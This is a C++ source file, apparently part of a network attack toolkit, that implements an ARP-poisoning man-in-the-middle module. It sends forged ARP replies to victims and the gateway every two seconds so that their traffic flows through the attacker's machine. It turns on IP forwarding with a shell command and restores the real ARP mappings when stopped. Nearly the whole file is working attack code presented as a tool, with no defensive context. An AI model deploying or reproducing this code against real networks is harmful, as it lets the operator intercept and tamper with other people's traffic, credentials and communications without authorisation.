#include "Mitm.hh"

Mitm::Mitm(const NetworkInterface &iface, std::ostream *out, const std::vector<std::string> &victimsIp, const std::string &gatewayIp)
    : AModule(iface, "Mitm", out), _run(false)
{
    HWAddress<6>    victimMac;

    _gateway.ip(IPv4Address(gatewayIp));
    _gateway.mac(arpRequest(_gateway.ip()));

    for (std::string victimIp : victimsIp)
    {
        victimMac = arpRequest(victimIp);

        _victims.push_back(victimIp);

        // Tell gateway thats _victim.ip() is _attackerMac (sender, sender, target, target)
        _poisonPackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), _attacker.mac()));
        // Tell victim thats _gateway.ip() is _attackerMac
        _poisonPackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _attacker.mac()));
        // Tell victim thats _gateway.ip() is gatewayMac
        _basePackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _gateway.mac()));
        // Tell victim thats _gateway.ip() is gatewayMac
        _basePackets.push_back(ARP::make_arp_reply( _gateway.ip(), victimIp, _gateway.mac(), victimMac));
    }

    // Enable ip forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    *_out << "Start Mitm";
}

void Mitm::poison(void)
{
    // Start poisoning arp tables
    _run = true;
    while (_run)
    {
        for (EthernetII pkt : _poisonPackets)
            _sender.send(pkt, _iface);

        // Don't need to spam
        sleep(2);
    }
}

void Mitm::start(void)
{
    std::thread     t(&Mitm::poison, this);

    t.detach();
}

void Mitm::stop(void)
{
    _run = false;

    for (int i = 0; i < 2; i++)
    {
        for (EthernetII pkt : _basePackets)
            _sender.send(pkt, _iface);
    }
}

std::string Mitm::info(void) const
{
    std::stringstream   ss;

    for (IPv4Address ip : _victims)
        ss << "[" << ip << "]" << " <---> " << "[" << _gateway.ip() << "]";
    return ss.str();
}

std::string Mitm::help(void)
{
    std::string     rep;

    rep += "Start a global man in the middle attack by arp poisoning.\n";
    rep += "\tOptions : <ipFile> <gatewayIp>";
    return rep;
}

const HWAddress<6> Mitm::arpRequest(const IPv4Address &targetIp)
{
    EthernetII      arpReq = ARP::make_arp_request(targetIp, _attacker.ip(), _attacker.mac());
    PDU             *response;

    if ((response = _sender.send_recv(arpReq, _iface)))
        return response->rfind_pdu<ARP>().sender_hw_addr();

    throw std::runtime_error("Can't send_recv");
}

void Mitm::arpReply(const IPv4Address &senderIp, const HWAddress<6> &senderMac, const IPv4Address &targetIp, const HWAddress<6> &targetMac)
{
    EthernetII      rep = ARP::make_arp_reply(targetIp, senderIp, targetMac, senderMac);

    _sender.send(rep, _iface);
}
